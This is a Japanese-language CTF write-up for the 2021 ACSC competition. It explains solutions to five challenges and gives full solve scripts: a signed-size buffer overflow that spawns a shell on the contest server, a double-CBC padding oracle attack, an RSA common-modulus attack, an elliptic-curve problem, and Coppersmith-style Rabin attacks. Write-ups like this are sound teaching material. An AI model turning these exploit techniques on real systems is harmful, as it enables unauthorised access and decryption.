+++
title = "Writeup: Asis Cyber Security Challenge"
date = 2021-09-19

[taxonomies]
tags = ["CTF", "Writeup", "Crypto", "Pwn", "Rabin", "Elliptic Curve"]
+++

今週土日に開催されていたAsis Cyber Security Challengeに出たので自分が解いた問題のWriteupを書きます

<!-- more -->

## Table of Contents

- [filtered](https://project-euphoria.dev/blog/21-acsc/#filtered)
- [RSA stream](https://project-euphoria.dev/blog/21-acsc/#rsa-stream)
- [CBCBC](https://project-euphoria.dev/blog/21-acsc/#cbcbc)
- [Swap on Curve](https://project-euphoria.dev/blog/21-acsc/#swap-on-curve)
- [Two Rabin](https://project-euphoria.dev/blog/21-acsc/#two-rabin)

## filtered

次のようなC言語のソースとそれをコンパイルしたものが与えられる。

```C
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

/* Call this function! */
void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
  exit(0);
}

/* Print `msg` */
void print(const char *msg) {
  write(1, msg, strlen(msg));
}

/* Print `msg` and read `size` bytes into `buf` */
void readline(const char *msg, char *buf, size_t size) {
  char c;
  print(msg);
  for (size_t i = 0; i < size; i++) {
    if (read(0, &c, 1) <= 0) {
      print("I/O Error\n");
      exit(1);
    } else if (c == '\n') {
      buf[i] = '\0';
      break;
    } else {
      buf[i] = c;
    }
  }
}

/* Print `msg` and read an integer value */
int readint(const char *msg) {
  char buf[0x10];
  readline(msg, buf, 0x10);
  return atoi(buf);
}

/* Entry point! */
int main() {
  int length;
  char buf[0x100];

  /* Read and check length */
  length = readint("Size: ");
  if (length > 0x100) {
    print("Buffer overflow detected!\n");
    exit(1);
  }

  /* Read data */
  readline("Data: ", buf, length);
  print("Bye!\n");

  return 0;
}

```

`checksec`の実行結果は次の通り

```bash
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

`win()`関数を呼べばシェルが起動するらしい。Canary(SSP)もPIEも無効なのであとはBOF出来る場所を探すだけだが、最初に`Size:`で指定したサイズしか読み込めない上に、`buf`のサイズである0x100より多くのバイトを指定すると`"Buffer overflow detected!\n"`と怒られて終わる。

しかし、入力サイズは`size_t`(多分符号なし整数)として`readline()`に渡される一方で`readint()`は符号付き整数で結果を返すのでこの違いを活かせば負数はクソデカい正の整数として`readline()`に渡される事になり、BOF出来る。

使用コードは次の通り

```Python
from pwn import remote, p64


if __name__ == "__main__":
    # addrs
    win = 0x4011d6

    sc = remote("167.99.78.201", 9001)
    sc.recvuntil(b"Size: ")
    sc.sendline(str(-1).encode())
    sc.recvuntil(b"Data: ")
    sc.sendline(p64(win) * 64)  # <- too lazy!!

    sc.interactive()

```

Flag: `ACSC{GCC_d1dn'7_sh0w_w4rn1ng_f0r_1mpl1c17_7yp3_c0nv3rs10n}`

## RSA Stream

次のようなスクリプトとその実行によって作られた`chal.enc`が与えられる。

```python
import gmpy2
from Crypto.Util.number import long_to_bytes, bytes_to_long, getStrongPrime, inverse
from Crypto.Util.Padding import pad

from flag import m
#m = b"ACSC{<REDACTED>}" # flag!

f = open("chal.py","rb").read() # I'll encrypt myself!
print("len:",len(f))
p = getStrongPrime(1024)
q = getStrongPrime(1024)

n = p * q
e = 0x10001
print("n =",n)
print("e =",e)
print("# flag length:",len(m))
m = pad(m, 255)
m = bytes_to_long(m)

assert m < n
stream = pow(m,e,n)
cipher = b""

for a in range(0,len(f),256):
  q = f[a:a+256]
  if len(q) < 256:q = pad(q, 256)
  q = bytes_to_long(q)
  c = stream ^ q
  cipher += long_to_bytes(c,256)
  e = gmpy2.next_prime(e)
  stream = pow(m,e,n)

open("chal.enc","wb").write(cipher)


```

フラグを同一法、異なる指数でRSAを用いて暗号化したものとこのスクリプトで排他的論理和をとったものが結合されて`chal.enc`として渡されている。というわけでこの処理を反転させるように排他的論理和を取れば各`pow(m,e,n)`が抽出出来る。

後は同一平文をを法は同じで異なる指数で暗号化しているものが複数得られるのでCommon Modulus Attackで解ける。

```python
from Crypto.Util.number import long_to_bytes, bytes_to_long, getStrongPrime, inverse
from Crypto.Util.Padding import pad, unpad
from xcrypto.prime import next_prime  # <- I'm too lazy to install `gmpy2`
from xcrypto.mod import ext_euclid


def common_modulus_attack(c1, c2, e1, e2, n):
    s1, s2, g = ext_euclid(e1, e2)
    _c1 = pow(c1, s1, n)
    _c2 = pow(c2, s2, n)

    return _c1 * _c2 % n


def get_params():
    n = 30004084769852356813752671105440339608383648259855991408799224369989221653141334011858388637782175392790629156827256797420595802457583565986882788667881921499468599322171673433298609987641468458633972069634856384101309327514278697390639738321868622386439249269795058985584353709739777081110979765232599757976759602245965314332404529910828253037394397471102918877473504943490285635862702543408002577628022054766664695619542702081689509713681170425764579507127909155563775027797744930354455708003402706090094588522963730499563711811899945647475596034599946875728770617584380135377604299815872040514361551864698426189453
    e = 65537
    cs = open("chal.enc", "rb").read()
    ms = open("chal.py", "rb").read()
    print(len(ms))
    print(len(cs))

    return ((n,e), (cs, ms))


def exploit():
    (n, e), (cs, ms) = get_params()
    _cs = []
    es = [e]
    for i in range(0, len(ms), 256):
        m = ms[i:i+256]
        if len(m) < 256:
            m = pad(m,256)
        m = bytes_to_long(m)
        c = cs[i:i+256]
        c = bytes_to_long(c)
        _c = c^m
        e = next_prime(e)
        _cs.append(_c)
        es.append(e)

    res = common_modulus_attack(_cs[0], _cs[1], es[0], es[1], n)
    print(long_to_bytes(res))



if __name__ == "__main__":
    exploit()
```

Flag: `ACSC{changing_e_is_too_bad_idea_1119332842ed9c60c9917165c57dbd7072b016d5b683b67aba6a648456db189c}`

## CBCBC

```python
#!/usr/bin/env python3

import base64
import json
import os
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from secret import hidden_username, flag

key = os.urandom(16)
iv1 = os.urandom(16)
iv2 = os.urandom(16)


def encrypt(msg):
    aes1 = AES.new(key, AES.MODE_CBC, iv1)
    aes2 = AES.new(key, AES.MODE_CBC, iv2)
    enc = aes2.encrypt(aes1.encrypt(pad(msg, 16)))
    return iv1 + iv2 + enc


def decrypt(msg):
    iv1, iv2, enc = msg[:16], msg[16:32], msg[32:]
    aes1 = AES.new(key, AES.MODE_CBC, iv1)
    aes2 = AES.new(key, AES.MODE_CBC, iv2)
    msg = unpad(aes1.decrypt(aes2.decrypt(enc)), 16)
    return msg


def create_user():
    username = input("Your username: ")
    if username:
        data = {"username": username, "is_admin": False}
    else:
        # Default token
        data = {"username": hidden_username, "is_admin": True}
    token = encrypt(json.dumps(data).encode())
    print("Your token: ")
    print(base64.b64encode(token).decode())


def login():
    username = input("Your username: ")
    token = input("Your token: ").encode()
    try:
        data_raw = decrypt(base64.b64decode(token))
    except:
        print("Failed to login! Check your token again")
        return None

    try:
        data = json.loads(data_raw.decode())
    except:
        print("Failed to login! Your token is malformed")
        return None

    if "username" not in data or data["username"] != username:
        print("Failed to login! Check your username again")
        return None

    return data


def none_menu():
    print("1. Create user")
    print("2. Log in")
    print("3. Exit")

    try:
        inp = int(input("> "))
    except ValueError:
        print("Wrong choice!")
        return None

    if inp == 1:
        create_user()
        return None
    elif inp == 2:
        return login()
    elif inp == 3:
        exit(0)
    else:
        print("Wrong choice!")
        return None


def user_menu(user):
    print("1. Show flag")
    print("2. Log out")
    print("3. Exit")

    try:
        inp = int(input("> "))
    except ValueError:
        print("Wrong choice!")
        return None

    if inp == 1:
        if "is_admin" in user and user["is_admin"]:
            print(flag)
        else:
            print("No.")
        return user
    elif inp == 2:
        return None
    elif inp == 3:
        exit(0)
    else:
        print("Wrong choice!")
        return None


def main():
    user = None

    print("Welcome to CBCBC flag sharing service!")
    print("You can get the flag free!")
    print("This is super-duper safe from padding oracle attacks,")
    print("because it's using CBC twice!")
    print("=====================================================")

    while True:
        if user:
            user = user_menu(user)
        else:
            user = none_menu()


if __name__ == "__main__":
    main()

```

ざっくり言うとユーザー名と管理者かどうかの情報を含んだJSONをAES-CBCで「2回」暗号化してbase64でエンコードしたものをログイントークンとして与え、ログイン時にはそれのデコード+復号結果と入力したユーザー名が同じでかつ管理者であるかを確認しており、管理者であればフラグを開示することが出来る。

管理者のトークンは名前を入力しない時に手に入れる事が出来るが、肝心のユーザー名がわからないためこのままではログインに成功しない。この問題はCTFのCryptoの問題であり、ペネトレーションテストではないので当然`admin`や`root`な訳がない。

AES-CBCでの復号に失敗、つまり殆どの場合は`unpad()`出来ない時とそれ以外のエラー文が異なっている上にCBCモードなのでPadding Oracle Attackが出来そうだが、2回暗号化している事から通常のPadding Oracle Attackは流用できない。

これは2つ前の暗号文ブロックのバイトを弄る事で同様の攻撃が出来る。`c3 || c2 || c1`というブロックの並びである時、復号関数を`D1, D2`とおくと`c1`を復号した結果`m1`は次のようになる。

`m1 = D2(D1(c1) ^ c2) ^ (D1(c2) ^ c3) = D2(D1(c1) ^ c2) ^ D1(c2) ^ c3`

`c3`を暗号化した結果が特に作用されていない事から通常のPadding Oracle Attackと似たような事が出来そうである。ここで`c3`を`c3'`に変化させることで通常のPadding Oracle Attack同様に`m1' := \x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10`が復号されたとすると

`m1' = D2(D1(c1) ^ c2) ^ D1(c2) ^ c3' = m1 ^ c3 ^ c3'`

が成り立つので、`m1 = m1' ^ c3 ^ c3'`で元の平文を求める事が出来る。

このような`c3'`の求め方も通常のPadding Oracle Attackと同様で下から1バイトずつ変化させてオラクルに問い合わせれば良い。

これで元のトークンに含まれていた暗号文が復号出来るのでユーザー名が`R3dB1ackTreE`である事がわかる(Writeup書いてる最中に気付いたけどrbtreeさんですかね?)。

これで後はトークンとこのユーザー名を提出すればフラグを開示出来る。(DRYを盛大に無視した)使用コードは次の通り。

```python
from pwn import remote
import json
import base64


def prompt(sc, choice):
    sc.recvuntil("> ")
    sc.sendline(str(choice).encode())


def create_user(sc, name):
    prompt(sc, 1)
    sc.recvuntil(b"username: ")
    sc.sendline(name.encode())
    sc.recvline()
    token = sc.recvline().strip().decode("utf-8")

    return token


def login(sc, name, token):
    prompt(sc, 2)
    sc.recvuntil(b"username: ")
    sc.sendline(name.encode())
    sc.recvuntil(b"token: ")
    sc.sendline(token)
    res = sc.recvline()

    return res


def get_iv_and_enc(token):
    raw_data = base64.b64decode(token)
    iv1 = raw_data[:16]
    iv2 = raw_data[16:32]
    enc = raw_data[32:]

    return (iv1, iv2, enc)


def bytes_xor(b1, b2):
    assert len(b1) == len(b2)
    ret = b""
    for c1, c2 in zip(b1, b2):
        ret += (c1 ^ c2).to_bytes(1, "little")

    return ret


if __name__ == "__main__":
    sc = remote("167.99.77.49", 52171)
    admin_token = create_user(sc, "")
    iv1, iv2, admin_enc = get_iv_and_enc(admin_token)
    print(len(admin_enc))

    # first step
    blocks = [bytearray(admin_enc[:16]), bytearray(admin_enc[16:32]), bytearray(admin_enc[32:])]
    for i in range(16):
        print("current index:", i)
        for c in range(256):
            blocks[0][15 - i] = c
            raw_data = iv1 + iv2 + bytes(blocks[0] + blocks[1] + blocks[2])
            token = base64.b64encode(raw_data)
            res = login(sc, "unko", token)  # <- what?
            if res != b"Failed to login! Check your token again\n":
                print("  found:", c)
                break

        # update blocks
        if i != 15:
            for j in range(i+1):
                blocks[0][15 - j] ^= ((i+1)^(i+2))

    last_pad = b"\x10" * 16
    plain = bytes_xor(bytes_xor(last_pad, bytes(blocks[0])), admin_enc[:16])
    print(plain)

    # second step
    blocks = [bytearray(iv2), bytearray(admin_enc[:16]), bytearray(admin_enc[16:32])]
    for i in range(16):
        print("current index:", i)
        for c in range(256):
            blocks[0][15 - i] = c
            raw_data = iv1 + bytes(blocks[0] + blocks[1] + blocks[2])
            token = base64.b64encode(raw_data)
            res = login(sc, "unko", token)
            if res != b"Failed to login! Check your token again\n":
                print("  found:", c)
                break

        # update blocks
        if i != 15:
            for j in range(i+1):
                blocks[0][15 - j] ^= ((i+1)^(i+2))

    last_pad = b"\x10" * 16
    plain = bytes_xor(bytes_xor(last_pad, bytes(blocks[0])), iv2)
    print(plain)

    # third step
    blocks = [bytearray(iv1), bytearray(iv2), bytearray(admin_enc[:16])]
    for i in range(16):
        print("current index:", i)
        for c in range(256):
            blocks[0][15 - i] = c
            raw_data = bytes(blocks[0] + blocks[1] + blocks[2])
            token = base64.b64encode(raw_data)
            res = login(sc, "unko", token)
            if res != b"Failed to login! Check your token again\n":
                print("  found:", c)
                break

        # update blocks
        if i != 15:
            for j in range(i+1):
                blocks[0][15 - j] ^= ((i+1)^(i+2))

    last_pad = b"\x10" * 16
    plain = bytes_xor(bytes_xor(last_pad, bytes(blocks[0])), iv1)
    print(plain)
```

Flag: `ACSC{wow_double_CBC_mode_cannot_stop_you_from_doing_padding_oracle_attack_nice_job}`

## Swap on Curve

次のような(非常にスッキリした)スクリプトとその実行結果が与えられる。

```python
from params import p, a, b, flag, y

x = int.from_bytes(flag, "big")

assert 0 < x < p
assert 0 < y < p
assert x != y

EC = EllipticCurve(GF(p), [a, b])

assert EC(x,y)
assert EC(y,x)

print("p = {}".format(p))
print("a = {}".format(a))
print("b = {}".format(b))

```

点`(x,y)`と`(y,x)`が共に楕円曲線に乗っているような`x,y`の`x`がフラグになっている。ここで`x,y`に関しては次のような関係が成り立っている。

$$
\begin{aligned}
y^2 &\equiv x^3 + ax + b \bmod p \cr
x^2 &\equiv y^3 + ay + b \bmod p
\end{aligned}
$$

ここで上の式の{{katex(body="x")}}については{{katex(body="x(x^2 + a)")}}と分解する事が出来、2次の項は下の式を代入する事で消去出来る。すると1次の項だけ残るので両辺2乗して強引に2次式にしてから再度代入すれば{{katex(body="x")}}の項を消去することが出来るので後はこれをSagemathの`roots()`メソッドに解かせて{{katex(body="y")}}を求め、下の式に代入したものの平方根を求めて終わり。

Ref by [taiyaki](https://twitter.com/taiyaki_ctf): [zer0pts CTF writeup - あさっちの不定期日記](https://taitai-tennis.hatenablog.com/entry/2021/03/07/233441)

使用コード(Sagemath)は次の通り

```python
from Crypto.Util.number import long_to_bytes


p = 10224339405907703092027271021531545025590069329651203467716750905186360905870976608482239954157859974243721027388367833391620238905205324488863654155905507
a = 4497571717921592398955060922592201381291364158316041225609739861880668012419104521771916052114951221663782888917019515720822797673629101617287519628798278
b = 1147822627440179166862874039888124662334972701778333205963385274435770863246836847305423006003688412952676893584685957117091707234660746455918810395379096

F_p = GF(p)
EC = EllipticCurve(F_p, [a, b])
R.<y> = PolynomialRing(F_p)
lhs = (y^2 - b)^2
t1 = y^3 + a*y + b
t2 = (y^3 + a*y + b + a)^2
rhs = t1*t2
poly = rhs - lhs

print(poly)
roots = poly.roots()

print(roots)

for r_y, _ in roots:
    lhs = r_y^3 + a*r_y + b
    if lhs.is_square():
        for x in lhs.square_root(all=True):
            print(long_to_bytes(x))
```

Flag: `ACSC{have_you_already_read_the_swap<-->swap?}`

「`swap<-->swap`ってなんだろう?」と思ってたら[作問者がTwitterで宣伝してた漫画](https://twitter.com/theoremoon/status/1439435607562862595)らしいです。

## Two Rabin

次のようなスクリプトとその実行結果が与えられる。

```python
import random
from Crypto.Util.number import *
from Crypto.Util.Padding import pad

from flag import flag

p = getStrongPrime(512)
q = getStrongPrime(512)
n = p * q
B = getStrongPrime(512)

m = flag[0:len(flag)//2]
print("flag1_len =",len(m))

m1 = bytes_to_long(m)
m2 = bytes_to_long(pad(m,128))

assert m1 < n
assert m2 < n

c1 = (m1*(m1+B)) % n
c2 = (m2*(m2+B)) % n

print("n =",n)
print("B =",B)
print("c1 =",c1)
print("c2 =",c2)

# Harder!

m = flag[len(flag)//2:]
print("flag2_len =",len(m))

m1 = bytes_to_long(m)
m1 <<= ( (128-len(m))*8 )
m1 += random.SystemRandom().getrandbits( (128-len(m))*8 )

m2 = bytes_to_long(m)
m2 <<= ( (128-len(m))*8 )
m2 += random.SystemRandom().getrandbits( (128-len(m))*8 )

assert m1 < n
assert m2 < n

c1 = (m1*(m1+B)) % n
c2 = (m2*(m2+B)) % n

print("hard_c1 =",c1)
print("hard_c2 =",c2)


```

フラグを2つに分け、片方はそのままと単純な線形パディング(PKCS#7)を施した上で[Rabin暗号](https://en.wikipedia.org/wiki/Rabin_cryptosystem)に突っ込んだものをくれる。

もう片方もRabin暗号に線形パディングが施したものを2つ突っ込むのは同じなのだが、どちらもパディングの値は不明。

前者の方はRSAの[Franklin-Reiter Related Message Attack](https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Franklin-Reiter_related-message_attack)をこれにも改良するだけで、変数が平文しか無いので2つの暗号文から同一根を持つ多項式を生成し、公約式を求めればその定数項にフラグが現れる。

後者の方は平文に加えて2つのパディングも未知であるが、Franklin-Reiter Related Message Attackと共に紹介される事が多い[Coppersmith's Short-Pad Attack](https://en.wikipedia.org/wiki/Coppersmith%27s_attack#Coppersmith%E2%80%99s_short-pad_attack)を改良すれば良い。

Rabin暗号の暗号化関数は2次式なので2つの暗号文が満たす多項式で終結式を作ると4次になる。`n`の大きさは1024bitなので定理通り受け取るなら256bitより小さいパディングの差なら無事に求める事が出来そうである。

本当はもう少し式を交えて解説しようと思ったが、英語版Wikipediaや他の解説(日本語なら[ももテクさん](https://inaz2.hatenablog.com/entry/2016/01/20/022936))を読めば事足りると思うのでそちらに投げる。手法の名前だけでも覚えて帰ってください。

使用コード(Sagemath)は次の通り

```python
from Crypto.Util.number import bytes_to_long, long_to_bytes
from Crypto.Util.Padding import pad


def gcd(a,b):
    while b:
        a,b = b, a%b

    return a.monic()



def get_params():
    flag1_len = 98
    n = 105663510238670420757255989578978162666434740162415948750279893317701612062865075870926559751210244886747509597507458509604874043682717453885668881354391379276091832437791327382673554621542363370695590872213882821916016679451005257003326444660295787578301365987666679013861017982035560204259777436442969488099
    B = 12408624070212894491872051808326026233625878902991556747856160971787460076467522269639429595067604541456868927539680514190186916845592948405088662144279471
    c1 = 47149257341850631803344907793040624016460864394802627848277699824692112650262968210121452299581667376809654259561510658416826163949830223407035750286554940980726936799838074413937433800942520987785496915219844827204556044437125649495753599550708106983195864758161432571740109614959841908745488347057154186396
    c2 = 38096143360064857625836039270668052307251843760085437365614169441559213241186400206703536344838144000472263634954875924378598171294646491844012132284477949793329427432803416979432652621257006572714223359085436237334735438682570204741205174909769464683299442221434350777366303691294099640097749346031264625862
    flag2_len = 98
    hard_c1 = 73091191827823774495468908722773206641492423784400072752465168109870542883199959598717050676487545742986091081315652284268136739187215026022065778742525832001516743913783423994796457270286069750481789982702001563824813913547627820131760747156379815528428547155422785084878636818919308472977926622234822351389
    hard_c2 = 21303605284622657693928572452692917426184397648451262767916068031147685805357948196368866787751567262515163804299565902544134567172298465831142768549321228087238170761793574794991881327590118848547031077305045920819173332543516073028600540903504720606513570298252979409711977771956104783864344110894347670094

    return ((n, B), (flag1_len, c1, c2), (flag2_len, hard_c1, hard_c2))


def exploit():
    (n, B), (flag1_len, c1, c2), (flag2_len, hard_c1, hard_c2) = get_params()
    m1 = solve1(n, B, flag1_len, c1, c2)
    m2 = solve2(n, B, flag2_len, hard_c1, hard_c2)


def solve1(n, B, flag1_len, c1, c2):
    pad1_len = 128 - flag1_len
    b_pad1 = int(pad1_len).to_bytes(1, "little")
    pad1 = bytes_to_long(b_pad1 * pad1_len)
    coef1 = 256**pad1_len

    P.<x> = PolynomialRing(Zmod(n))
    g1 = x*(x+B) - c1
    g2 = (coef1 * x + pad1) * (coef1*x + pad1 + B) - c2
    res = -gcd(g1, g2).coefficients()[0]
    res = int(res)
    print(long_to_bytes(res))

    return res


# ref: https://inaz2.hatenablog.com/entry/2016/01/20/022936
def solve2(n, B, flag2_len, c1, c2):
    pad2_len = 128 - flag2_len
    pad_limit = 2**(pad2_len*8)
    PRxy.<x,y> = PolynomialRing(Zmod(n))
    PRx.<xn> = PolynomialRing(Zmod(n))
    PRZZ.<xz,yz> = PolynomialRing(Zmod(n))

    g1 = x*(x+B) - c1
    g2 = (x+y)*(x+y+B) - c2

    q1 = g1.change_ring(PRZZ)
    q2 = g2.change_ring(PRZZ)

    h = q2.resultant(q1)
    h = h.univariate_polynomial()
    h = h.change_ring(PRx).subs(y=xn)
    h = h.monic()

    roots = h.small_roots(X=pad_limit,epsilon=1/50)
    for delta in roots:
        print(int(delta).bit_length(), delta)
        P.<x> = PolynomialRing(Zmod(n))
        g1 = x*(x+B) - c1
        g2 = (x+delta)*(x+delta+B) - c2
        res = -gcd(g1, g2).coefficients()[0]
        res = int(res)
        print(long_to_bytes(res))


if __name__ == "__main__":
    exploit()
```

Flag: `ACSC{Rabin_cryptosystem_was_published_in_January_1979_ed82c25b173f38624f7ba16247c31d04ca22d8652da4a1d701b0966ffa10a4d1_ec0c177f446964ca9595c187869312b2c0929671ca9b7f0a27e01621c90a9ac255_wow_GJ!!!}`

## 感想

ここ最近の体力と睡魔の都合で半日弱しか挑めませんでしたが、ほぼ初めてのソロCTFで楽しかったです。同時に普段如何にチームに寄生しているかと、無力さも感じましたが...。

来年もまだチャンスがあればQualifiedを目指したいですが、このままCryptoばかりやってても普段からソロでやってる全分野担当大臣達(解き続ける体力と集中力も凄い)に相変わらず負けそうなので自分の解ける幅も広げていきたいです。

運営(作問、インフラ、etc...)の皆さんにとっては初めての催しであり大変だったと思いますが、このような楽しいCTFを開いていただきありがとうございました。来年以降も毎年開催される事を祈っています。
